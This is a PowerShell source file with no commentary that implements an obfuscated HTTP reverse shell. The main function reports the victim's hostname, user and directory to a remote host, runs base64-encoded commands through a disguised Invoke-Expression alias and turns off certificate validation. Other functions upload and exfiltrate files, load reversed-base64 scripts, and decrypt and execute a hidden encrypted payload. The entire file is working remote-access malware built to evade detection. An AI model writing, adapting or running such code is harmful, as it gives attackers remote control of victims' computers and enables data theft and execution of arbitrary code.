function policed{
    param
    (
        [string]$ip,
        [string]$port,
        [switch]$ssl
    )

    $help=@"

.SYNOPSIS
    WebRev.
    PowerShell Function: policed
    Required Dependencies: Powershell >= v3.0
    Optional Dependencies: None
.DESCRIPTION
    .

.ARGUMENTS
    -ip   <IP>      Remote Host
    -port <PORT>    Remote Port
    -ssl            Send traffic over ssl

.EXAMPLE
"@

    if(-not $ip -or -not $port) { return $help; }
    
    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
    
    [array]$FogdRhmr99 = "I","n","t","E","r","n","e","X" ;set-alias taleska-ei-vrixeka $($FogdRhmr99 | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
    

    $KOgwcsEF99 = getPwd;
    $hname = Calvert -str "$env:computername";
    $cuser = Calvert -str "$env:username";

    $json = '{"type":"newclient", "result":"", "pwd":"' + $KOgwcsEF99 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}';
    
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    $UVfHpzbC99 = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
    [System.Net.ServicePointManager]::SecurityProtocol = $UVfHpzbC99;
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

    try { $error[0] = ""; } catch {}

    maximize;
    $FYwLKyJm99 = (ls function:).Name;
    [array]$xagTjvSy99 = (ls function: | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream );

    while ($true)
    {
        try
        {
            $req = Invoke-WebRequest $url -useb -Method POST -Body $json -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json";
            $MncLeRii99 = $req.Headers["Authorization"];
            $c = [System.Convert]::FromBase64String($MncLeRii99);
            $cstr = [System.Text.Encoding]::UTF8.GetString($c);
            $aReArFpd99 = "";
            $NBztcAng99 = "";

            if($cstr.split(" ")[0] -eq "autocomplete")
            {
                $SVHCRZXf99 = (Get-Command | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream);
                $SVHCRZXf99 = Calvert -str "$SVHCRZXf99";
                $type = '"type":"4UT0C0MPL3T3"';
                $aReArFpd99 = $SVHCRZXf99;
            }
            elseif($cstr.split(" ")[0] -eq "upload")
            {
                $type = '"type":"UPL04D"';
                try
                {
                    $TlSBNKOr99 = [System.Text.Encoding]::ASCII.GetString($req.Content);
                    if ($cstr.split(" ").Length -eq 3) {
                        $wjkQLJae99 = $cstr.split(" ")[2];
                    }
                    elseif ($cstr.Substring($cstr.Length-1) -eq '"') {
                        $wjkQLJae99 = $cstr.split('"') | Select-Object -SkipLast 1 | Select-Object -Last 1;
                    }
                    else {
                        $wjkQLJae99 = $cstr.split(' ') | Select-Object -Last 1;;
                    }
                    $NPHxXele99 = [System.Convert]::FromBase64String($TlSBNKOr99);
                    $NPHxXele99 | Set-Content $wjkQLJae99 -Encoding Byte
                    $aReArFpd99 = '[+] File successfully uploaded.';
                }
                catch {}
            }
            elseif($cstr.split(" ")[0] -eq "download")
            {
                $type = '"type":"D0WNL04D"';
                try
                {
                    if ($cstr.split(" ").Length -eq 3){
                        $cstr = $cstr.Replace('"', '');
                        $HLDMiKXS99 = $cstr.split(" ")[1];
                        $XDJwiyIH99 = $cstr.split(" ")[2];
                    }
                    elseif ($cstr.Substring($cstr.Length-1) -eq '"'){
                        if ($cstr.split(' ')[1][0] -eq '"') {
                            $HLDMiKXS99 = $cstr.split('"')[1];
                        } else {
                            $HLDMiKXS99 = $cstr.split(' ')[1];
                        }
                        $XDJwiyIH99 = $cstr.split('"')[-2];
                    }
                    else{
                        $HLDMiKXS99 = $cstr.split('"')[1];
                        $XDJwiyIH99 = $cstr.split(' ')[-1];
                    }

                    if (Test-Path -Path $HLDMiKXS99) 
                    {
                        $JtUpMFOz99 = [System.IO.File]::ReadAllBytes($HLDMiKXS99);
                        $b64 = [System.Convert]::ToBase64String($JtUpMFOz99);
                        $aReArFpd99 = '[+] File successfully downloaded.", ' + '"file":"' + $b64 + '", ' + '"pathDst":"' + $XDJwiyIH99;
                    } 
                    else
                    {
                        $type = '"type":"3RR0R"';
                        $aReArFpd99 = '[!] Source file not found!';
                    }
                }
                catch {}
            }
            elseif($cstr.split(" ")[0] -eq "loadps1")
            {
                $type = '"type":"L04DPS1"';
                try
                {
                    $LAQlWoFS99 = [System.Text.Encoding]::ASCII.GetString($req.Content);
                    $LAQlWoFS99 = $LAQlWoFS99.ToCharArray();
                    [array]::Reverse($LAQlWoFS99);
                    $LAQlWoFS99 = -join($LAQlWoFS99);
                    $NPHxXele99 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($LAQlWoFS99));
                    taleska-ei-vrixeka $NPHxXele99 | Out-String;
                    $aReArFpd99 = '[+] File loaded sucessfully.'
                }
                catch
                {
                    $type = '"type":"3RR0R"';
                    $aReArFpd99 = '[!] Error loading PS1!';
                }
            }
            else
            {
                $type = '"type":"C0MM4ND"';                
                $enc = [system.Text.Encoding]::UTF8;
                $new = (taleska-ei-vrixeka $cstr | Out-String);

                $bytes = $enc.GetBytes($new);
                $DaJJrwIo99 = $enc.GetBytes($aReArFpd99);
                $aReArFpd99 = [Convert]::ToBase64String($DaJJrwIo99 + $bytes);
            }

            if ($cstr.split(" ")[0] -eq "cd") {
                $KOgwcsEF99 = getPwd;
            }
            $json = '{' + $type + ', "result":"' + $aReArFpd99 + '", "pwd":"' + $KOgwcsEF99 + '"}';
        }
        catch
        {
            if ($error[0] -ne "")
            {
                try
                {
                    $type = '"type":"3RR0R"';
                    $err = $error[0] | Out-String;
                    $error[0]= "";

                    $bytes = $enc.GetBytes($err);
                    $aReArFpd99 = [Convert]::ToBase64String($bytes);
                    $json = '{' + $type + ', "result":"' + $aReArFpd99 + '", "pwd":"' + $KOgwcsEF99 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}'
                } catch {}
            }
        };
    };
}

function Calvert
{
    Param([String] $str)

    $enc = [system.Text.Encoding]::UTF8;
    $bytes = $enc.GetBytes($str);
    $aReArFpd99 = [Convert]::ToBase64String($bytes);
    return $aReArFpd99;
}

function getPwd()
{
    $enc = [system.Text.Encoding]::UTF8;
    $pwd = "pwd | Format-Table -HideTableHeaders";
    $FywTWBeI99 = (taleska-ei-vrixeka $pwd | Out-String);
    $bytes = $enc.GetBytes($FywTWBeI99);
    $KOgwcsEF99 = [Convert]::ToBase64String($bytes);
    return $KOgwcsEF99;
}

function recruit
{
    $menu = ""

    if ([int]$PSVersionTable.PSVersion.Major -ge 4 ) {
        $QaUUzwtX99 = (ls function:).Name
        [array]$xagTjvSy99 = "Close_Console","Close_DNS","Close_TCP","Close_UDP","Main","Main_Powershell","ReadData_CMD","ReadData_Console","ReadData_DNS","ReadData_TCP","ReadData_UDP","Setup_CMD","Setup_Console","Setup_DNS","Setup_TCP","Setup_UDP", "Stream1_Close","Stream1_ReadData","Stream1_Setup","Stream1_WriteData","WriteData_CMD","WriteData_Console","WriteData_DNS","WriteData_TCP","WriteData_UDP","Close_CMD","menu","f","func"
        $QaUUzwtX99 = $QaUUzwtX99 + $xagTjvSy99
        $cLGurjNn99 = (Compare-Object -ReferenceObject $FYwLKyJm99 -DifferenceObject $QaUUzwtX99).InputObject
        $aqBpuoxf99 = foreach ($GizCQWfb99 in $cLGurjNn99) { if ($xagTjvSy99 -notcontains $GizCQWfb99) {"`n [+] $GizCQWfb99"}}
        $menu = $menu + $aqBpuoxf99 + "`n";
    } else {
        [array]$cLGurjNn99 = (ls function: | Where-Object {($_.name).Length -ge "4" -and $_.name -notlike "Close_*" -and $_.name -notlike "ReadData_*" -and $_.name -notlike "Setup_*" -and $_.name -notlike "Stream1_*" -and $_.name -notlike "WriteData_*" -and $_.name -notlike "Menu" -and $_.name -ne "f" -and $_.name -ne "func" -and $_.name -ne "Main" -and $_.name -ne "Main_Powershell"} | select-object name | format-table -HideTableHeaders | Out-String -Stream )
        $FSiCQCXA99 = ($cLGurjNn99 | where {$xagTjvSy99 -notcontains $_}) | foreach {"`n[+] $_"}
        $FSiCQCXA99 = $FSiCQCXA99 -replace "  ","" 
        $menu = $menu + $FSiCQCXA99 + "`n"
        $menu = $menu -replace " [+]","[+]"
    }
    return $menu;
}

function maximize
{
    $s256 = New-Object System.Security.Cryptography.SHA256CryptoServiceProvider
    $k = $s256.ComputeHash(@(76,49,107,48,114,45,100,51,45,66,51,76,76,48,116,52))
    $scrt = "76492d1116743f0423413b16050a5345MgB8AG8ASwBMAEYATgBkAE4AYwA0ADEAcgBBAGsAKwBZAGMARwBWAEwAQwBwAFEAPQA9AHwAYgA1ADMAZQA1AGYAMwA1ADUAZQAyAGUAZQA4ADQAMwA0ADYAMAAxADAAMgA4ADgAMAAyADQAMQAyADgAOQA2ADYANQBkAGEAMwBlAGEAZQBjADkAMgA2ADMANQAyAGQAZgAyAGIAMgBiADQAYgBhADMAMAAxADYAOQA3ADkAZQAyADYAZABkAGIANQA1ADcAOAA5AGMAZgBmAGEANQAxAGUANwBlAGEAZgA1ADAAMgAwADYAMgAxADgAZgA4ADgAZAA2ADgAMAA3ADUANgA1ADUANwA4ADcANQBmADEAMgA3ADEAMgA2ADkAMwA3ADYANgAyADQAOQA5AGMAYQAwADQAYwA2ADQAMQBiADIAOQAwADQAYQA1ADgAOAA0ADUAZgBkADUAOABiADIAZgA5ADgANwA4AGEAMwBmADYAMQAyADgAMQBhADUAZAA2ADUAMAAxADAANQAyADEAOQAwAGYANwA4ADIAZgBlAGIANgBjADgAYgBiADAAYwA5ADcAMwA4ADYAZQA1AGEAMgBhADUAZABlAGQAYQBhADIAYgA0ADQANgA0AGIAZAAxAGUAZAA2ADIANQBiADIAOQBkADMAMgA3ADEAYwBkADgAZABmADYAYwAzAGYANwA5ADEAZABhADcANQBiAGQAYwBiAGEAYwBiADkANgA1ADAAOABiAGEANQBlAGQAZgA1ADMAOABhADYAZAAxADkANgBlADgAZABkAGUANQAzADIAYQA5AGUAOQBmADcANAAyADQANABhAGMAMwBlADMAMgA0ADAANQAxADUAOQBhADIAMwBjAGIAOQA0AGEAMQAxADIAYQBkADAAMgBlADIANgBlAGQAOAAzADAAZgAyAGQAZAAyADMAMgA2AGUAMQA0ADQAOQBkADIAMwBlADgAOABiADAANQAxADEAZgBjADQAYgBkADgANAA5AGIAZQAzAGYANQAzAGEAMQBlAGUAYgAzAGQAMwBhADEAOAA3ADQAMABkADUAZABjADUAZgBkADIAMwBjADEANQA3ADkAOAA1ADkAYQA5ADkAMQA5ADUANwBiAGIAZQA2ADcAMgA4ADQAYwBkAGIAOAA1ADEAMwA1ADUANQAzADgAYwA0AGUAZgBkADIANAA0ADUANAA5ADIAYwA3ADUAOQA1ADQAOQBhADYAYwBmADIANQAxADgANQAwADEANQAwADcANAA3ADMAZgA2ADAANABkAGEAZQA4ADkAMABiADEAZAA2ADIAYgAzAGYAYgBkADMAYgA1ADQAYwBiADAANgAwADQAMwBjAGIAYQAwAGEAZAA1ADMAZQAxAGIANgAyAGUAMwAzADgAZAA1ADMAMwBlAGMAOQA4ADUAYQA4AGYAMAAxAGIAMQBiADAAOAA2AGIAYgBjAGUANAA1ADAAOQBmADgANwA4AGMAZABlAGYAZQAyAGIAZgA3ADQAMAA3ADEAYQA5ADYAYwAxADgAOAA2AGMAZQBiADkAYgBlADIAMAA2AGYAMQBmAGEAOQBiAGEANAA1ADEAMgA3ADkAZgBiADEAOABiADEAMwBhAGYAZABlADIANABiADQAYwAwADgANwAwADIAMwBjAGEAMQBjAGUANQA4ADcAMgBlADYAOAA3ADIAYwBjADkAMwA2AGYAMAA1ADgANgA1ADAAOABiAGUANgAwADIANgA2ADgAZAA4AGEAMABkADkAZgA5AGEANAA0AGEAYQBmADIANgAzAGIAZAAxADYAZgBiAGYAYgA1AGQANgAwADEANgA0AGIAMwAxAGMANQAwAGMANABkAGQAYgAwADUAOQA3AGUANQBmADgAMAAxADgAYwA2AGMAYQAzAGMAMAA1AGYAOQA4ADgANQBlADUANAAxAGEAOAAwAGUAZAA5ADMANABjAGIAMQA3AGIANQBiADAAYQBlADEAYgAzADQAZgAwAGUAMwA2AGIANQAwADgAOAAxAGEANABkADMAMAA5ADcAMwAxADEANgA4ADgAMgBkADgAOQAzAGEAZABhAGUANABkADQAZgA2ADEAMwAxADcANAAxAGUAYQA4AGYAMwBkADAAZABkADcAYgA3AGEAMwA0AGUAOABjADIAYQBjADQAZgA0ADUAYgA5ADAAYgBhADYANQAzADgAMgA2ADgAMgA2AGIAMQBlAGUANwBmADIAMABhADIAMgBkADUAMQAxADMAOQAzAGIAMwA3AGYAZAAwAGQAOQA4ADkANgAyAGUAMQA1AGIAYwA5ADAAOAA0ADQAOABkAGEAMwA0ADIANQAwAGYAYQA0AGMAZABmAGYAZQA0ADEAYQAzAGQAYgBkAGUAOQBjADAAYgBhADcAZAA3AGUAZgA5ADAANQA3ADAAZgA0AGIAZAAwADIANwBlADMAMwA4ADYANgBlADcAMgAzADUAZgA2ADkAZQAxADUAOAA4AGQAYgA0AGQAOQAxAGQANgBiADEAMgAzADEAOQA4ADQAZQBhAGUAYgA5AGEANgBmADQANwAwADMANwBlAGMAYQBiAGIAZQBkADUANQAzADEAYgA2AGYANQA2ADMAMQAzADcAZgAyADQAOAA2ADUAYwAxADIAZQAxAGYAOQA0ADkAOQBmADYAMAA0ADcANgBkAGMAZABlADMAYwA2ADgAOABiAGEAOQA5ADMAYQAzADcANAA4AGIANAA3ADYAMwBlADMAYwBkADgAMwA1ADEAMQBkADIAZgA5ADAAOQBlAGIANwBmADcANAA2ADYAYQA5ADUAZQBiADIAMgAwADEAZgAzADQAOQA2AGIAZQAzADQAOAA0AGIAYgAxAGMANwAzADUAOQA2AGYANQAzAGYAZABhAGYANwA0ADMANAAxAGMAYgBhADYANAAxADUAOAA5ADUANQA3AGUAOAA1ADYAMgBjADgANgBkADcAYQA1ADMANQAyADIANQAxAGEANAA2ADkAMgA2ADUAYQA2ADAAMABhAGIAZAA4AGEAMQA5ADkAZAA5ADUAYQA5AGIAZgBlAGUAOQBmADAANwAxADAAOQA0ADYAMABiAGQANgBlAGIAOAA2ADAAYwAwADMAMgA5ADUAMQAxAGYAMABmADEANQBlADkAMQBjAGUAMgBlADYANgA3ADMAMwA0ADEAYgBhAGEAYQBhAGQAMABlADcAYQA0AGYAYQA1ADMAOABhADYAMQBlAGQAYgBkAGIAMQA2ADgANwA0AGEAZgBjADcAMAA0ADgAYQA0ADEANwAxAGIAYwBiAGIAYQA2AGQAMgAzAGIAOQA3ADIAOAAxADgAMAAzADQANQA4ADUAMgAwADUAMQA2ADUAZgA1ADIAOQBiADkAOABhAGMAOQAwAGQAMwA2AGQAZABkADgANwBhADgAMgA0ADEAMQA4ADQANgBiADEAZgAzADUANAAzAGQANQA2AGYANgBmAGEAYwA2AGQAZgBiADEAMQA1ADIAMwAxAGQANQA3ADQANgBhADQANAA4ADgANABiADAAZQA0AGIAZgBlADkAZQBhADkANABmAGEAMQBhADYANwAxAGQAZAA1ADkAYgA5ADIAMwAxADUAOAAzAGQANQAyADQAMQAzADkAZgBiADIAZQA4AGEAMgBmADYAMwBiADEAMAAzADUAMwBiADUAZQAzADEAMAA0ADIANQA5AGEANwAzADYAMgBkAGMAZABmADYAOAAyAGEANAA5ADUAMwAzADQAYwA0AGYAYgAwAGMAYwBlADQANwAzADEAZABhADMAYgA0AGUAMABlAGIAZABmADgAOQA3AGQAZgA3ADIAMwA4ADIAMQAxADcAOABhADcAMAA0AGQAMgAxADQAMQAxADYANwA3AGQAYgA4ADAAZgAwAGUAYgA2AGYAZAA2ADIAOABlADkANwBhAGQANAAzADAAYgBmADYAMABlADkAZABkADUAYgA2ADAANwA1ADcANQBkAGUAYgAxAGQANQA0ADkAZAA4AGIAOABjADQAYQA1ADQANwBkADMAYwBjADYAYwAxADcAOAA0AGYAOABmAGQAOABjADIAYwA0ADEANgBiADgAMgA5ADAAZQAxAGEAZQA2ADgAYgBiADEAOQA5ADQAYgBjAGEAYwA0ADYAMQAwADIANgA2ADgAOQA0ADgAZAA5ADcAOAAzAGEAYQAzAGYAYgA0AGMAMwA5AGQAZAAzADMAYQBkAGIAOQA3ADIAMABjAGIANwBhADEAYQA0ADUAYQA0ADAANwA5AGEANwA4ADEAZAA0ADYAMAAzAGUANgA5AGIAZgAxADMANgA1ADAAZgA1AGQAZABjADEAMwA3ADYANAA4ADQAMQBlADIAYwBjADMANgBmAGIAOAAyAGYAOAA0ADEAMgAwAGEANwA2AGIANAA0AGYAYQAzAGMAMQBjADIANQA1AGIAYgA1AGQAYQA5AGIANQAxADEAZABlADkANwBjADkAZAA3AGQAZQBiAGEAYQA0AGUANABjAGYAYgA2ADYANgA4ADgANAA3AGMANwBmADAAMwA2ADEAZAAwADgAMAAwAGEAYwAyADMANQA2AGQAOABlADkANQAxAGEAYQAxADEANQAwADAAMgBiADEANwBmAGMAZQBhADgAMwAyADQAZAAzAGUAMwA5ADMAMgA1ADYAZQA5ADMAMAAwADcAZQBmAGQAZgBhADkANABjADQAZAAwADIANgAwADUAZABmADEAMQAwADAAMAA0ADMAMwBiADMAMgA4ADgAZAA3AGUANAAwADUAMwAxADcAZABmADQANwBkADQAYwA4ADQANgBhADQAZQA2ADAANgA5ADUAMABhAGMANwAwADIAMQA2ADcAYQA5ADUAZgAyAGMAOQA2AGIAZAA0AGMAMAAzAGEAMQAxADcANwA3AGMAZgAxADkAYgA4ADAAYQBlAGIAYQAyAGEANQA3ADgAYwAyADYANQA1ADYAMAA3ADkANwBjAGIANwAzADYANgA2ADQAYgA4AGQAMAA4AGEANABmADIAOAAzADkAZgBlADkAMAA3ADkAMAAzADgAMQA5ADkAZQAyAGQANQBhADkAZQBhADIAZQBmADEANgAxADIAMQBhADUANgA4AGUANwAzADEAZgBkAGYAMAA5ADAAYwAwAGIANAA0ADEAZQBjADAAMgAxAGQAMABhAGIAYgA5AGQANQBhADYAOAAxAGYAMQAxADYAYwBiADUAZAA1AGIAMwA0ADMANwA4ADYANwAwAGEAMQAxADAAMwA1ADEAYQAxAGEAOAAzAGIAZgA2AGMAZQBmAGQAZQBlADEAMwBiADQANAA4ADAANwA2ADUAOAAwADcANABhADcAMwAxADQAMABiAGYAOQA0AGMAOQBhAGYAZgAzADQAZgAyAGEAOQBhADYANwAyAGQAZAAxAGMAOAA4AGUAYQA5AGEAMAA5ADAANABjADQAYwAwAGQAMwBhAGQAOQBkAGUAYgBmAGQAMwA2ADkAMABkADQAYgA4ADUAOAAyAGUAZQBiADkAZABmAGUANAAwAGYAOAA4AGQAOAA4ADEAZQA0AGUANgAyADYAYgAwAGIAMABiADAAYwA5ADYAZgA4ADgAYQAzADUAMgAyADQAZQAyADQAOAAxADgANgBhADAAZABjAGYANAA2ADAANwAwAGMAYwBlADkAZQBlADIANgBiADgAOQA2ADQAYwBlAGMAYQAzADEAMgBiADkANgBhAGMAMQAyADQAMwAwAGIAZgBkADMANAAzADkAYwAzADMANwAxADcANgBlADcANAAyADkAYgA5AGIAMgAxADEAYQBmAGYANAA1ADIANAAxAGIANwA0ADEAMwA5ADAAMABjADUAZQA3ADcAZABlADYAMABmADkANAA2ADgAOQBiAGYA"
    $rHCyVprT99 = $scrt | ConvertTo-SecureString -Key $k
    $data = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($rHCyVprT99))
    taleska-ei-vrixeka $data;
}

